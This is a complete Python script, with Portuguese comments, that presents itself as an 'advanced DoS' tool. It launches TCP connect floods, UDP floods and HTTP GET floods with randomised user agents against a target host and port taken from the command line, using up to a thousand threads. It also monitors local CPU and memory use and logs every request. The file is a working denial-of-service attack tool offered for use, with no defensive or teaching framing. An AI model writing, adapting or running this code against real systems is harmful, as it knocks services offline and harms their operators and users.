import socket
import threading
import time
import random
import colorama
import argparse
import logging
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import psutil

colorama.init(autoreset=True)

# Cores ANSI
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
WHITE = '\033[97m'
RESET = '\033[0m'

# Configuração de log
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='dos_attack.log'
)

class AdvancedDoS:
    def __init__(self, target_host, target_port, attack_type="tcp", 
                 num_threads=1000, max_workers=None, rate_limit=0,
                 use_proxy=False, custom_headers=None, verbose=False):
        self.target_host = target_host
        self.target_port = target_port
        self.attack_type = attack_type
        self.num_threads = num_threads
        self.max_workers = max_workers or min(num_threads, 1000)
        self.rate_limit = rate_limit  # Requisições por segundo
        self.use_proxy = use_proxy
        self.custom_headers = custom_headers or {}
        self.verbose = verbose
        self.running = False
        self.stats = {
            'requests_sent': 0,
            'connections_failed': 0,
            'cpu_usage': 0,
            'memory_usage': 0
        }
        
    def log(self, message, level=logging.INFO):
        """Log com cores e nível de severidade"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        if level == logging.ERROR:
            formatted_msg = f"{RED}[{timestamp}] {WHITE}{message}{RESET}"
        else:
            formatted_msg = f"{GREEN}[{timestamp}] {WHITE}{message}{RESET}"
            
        print(formatted_msg)
        logging.log(level, message)
    
    def update_stats(self):
        """Atualiza estatísticas em tempo real"""
        self.stats['cpu_usage'] = psutil.cpu_percent(interval=1)
        self.stats['memory_usage'] = psutil.virtual_memory().percent
        self.log(f"CPU: {self.stats['cpu_usage']}% | Memory: {self.stats['memory_usage']}%", 
                logging.WARNING)
    
    def generate_user_agents(self):
        """Gera User-Agents aleatórios"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
        ]
        return random.choice(user_agents)
    
    def generate_headers(self):
        """Gera headers HTTP customizados"""
        headers = {
            "User-Agent": self.generate_user_agents(),
            "Accept": "*/*",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        }
        
        # Adiciona headers customizados
        headers.update(self.custom_headers)
        return headers
    
    def tcp_dos(self):
        """Ataque TCP SYN flood avançado"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_host, self.target_port))
                sock.close()
                self.stats['requests_sent'] += 1
                self.log("Request Sent !")
                
                # Aplica limite de taxa se configurado
                if self.rate_limit > 0:
                    time.sleep(1/self.rate_limit)
                    
            except Exception as e:
                self.stats['connections_failed'] += 1
                self.log(f"Connection failed ! Error: {str(e)}", logging.ERROR)
                continue
    
    def udp_dos(self):
        """Ataque UDP flood avançado"""
        data = bytes(random.randint(65, 122) for _ in range(1024))
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (self.target_host, self.target_port))
                sock.close()
                self.stats['requests_sent'] += 1
                self.log("Request Sent !")
                
                if self.rate_limit > 0:
                    time.sleep(1/self.rate_limit)
                    
            except Exception as e:
                self.stats['connections_failed'] += 1
                self.log(f"Connection failed ! Error: {str(e)}", logging.ERROR)
                continue
    
    def http_dos(self):
        """Ataque HTTP GET flood avançado"""
        headers = self.generate_headers()
        request = f"GET / HTTP/1.1\r\n{'\r\n'.join([f'{k}: {v}' for k, v in headers.items()])}\r\n\r\n"
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_host, self.target_port))
                sock.sendall(request.encode())
                sock.close()
                self.stats['requests_sent'] += 1
                self.log("Request Sent !")
                
                if self.rate_limit > 0:
                    time.sleep(1/self.rate_limit)
                    
            except Exception as e:
                self.stats['connections_failed'] += 1
                self.log(f"Connection failed ! Error: {str(e)}", logging.ERROR)
                continue
    
    def monitor_system(self):
        """Monitora uso do sistema em tempo real"""
        while self.running:
            self.update_stats()
            time.sleep(5)  # Atualiza a cada 5 segundos
    
    def start(self):
        """Inicia o DoS avançado"""
        self.running = True
        
        # Inicia thread de monitoramento
        monitor_thread = threading.Thread(target=self.monitor_system)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Cria pool de threads
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            # Cria threads conforme o tipo de ataque
            if self.attack_type == "tcp":
                for _ in range(self.num_threads):
                    futures.append(executor.submit(self.tcp_dos))
            elif self.attack_type == "udp":
                for _ in range(self.num_threads):
                    futures.append(executor.submit(self.udp_dos))
            else:
                for _ in range(self.num_threads):
                    futures.append(executor.submit(self.http_dos))
            
            # Mantém rodando até Ctrl+C
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\nEncerrando DoS...")
                self.running = False
                
                # Exibe estatísticas finais
                self.log(f"Estátisticas finais:")
                self.log(f"- Requisições enviadas: {self.stats['requests_sent']}")
                self.log(f"- Conexões falhadas: {self.stats['connections_failed']}")
                self.log(f"- CPU final: {psutil.cpu_percent()}%")
                self.log(f"- Memória final: {psutil.virtual_memory().percent}%")

def parse_arguments():
    """Parseia argumentos da linha de comando"""
    parser = argparse.ArgumentParser(description='DoS Avançado')
    parser.add_argument('host', help='Host alvo')
    parser.add_argument('port', type=int, help='Porta alvo')
    parser.add_argument('--type', choices=['tcp', 'udp', 'http'], 
                       default='tcp', help='Tipo de ataque')
    parser.add_argument('--threads', type=int, default=1000, 
                       help='Número de threads')
    parser.add_argument('--rate-limit', type=float, default=0,
                       help='Limite de taxa (requisições por segundo)')
    parser.add_argument('--headers', action='append',
                       help='Headers HTTP customizados (formato: Key=Value)')
    parser.add_argument('--verbose', action='store_true',
                       help='Modo verboso')
    return parser.parse_args()

def main():
    args = parse_arguments()
    
    # Processa headers customizados
    custom_headers = {}
    if args.headers:
        for header in args.headers:
            key, value = header.split('=', 1)
            custom_headers[key] = value
    
    print(f"{RED}[STATUS] Iniciando DoS avançado para {args.host}:{args.port}")
    print(f"{RED}[STATUS] Tipo de ataque: {args.type}")
    print(f"{RED}[STATUS] Threads: {args.threads}")
    print(f"{RED}[STATUS] Limite de taxa: {args.rate_limit} req/s")
    if custom_headers:
        print(f"{RED}[STATUS] Headers customizados: {custom_headers}")
    
    dos = AdvancedDoS(
        args.host, args.port, args.type, 
        args.threads, None, args.rate_limit,
        False, custom_headers, args.verbose
    )
    dos.start()

if __name__ == "__main__":
    main()
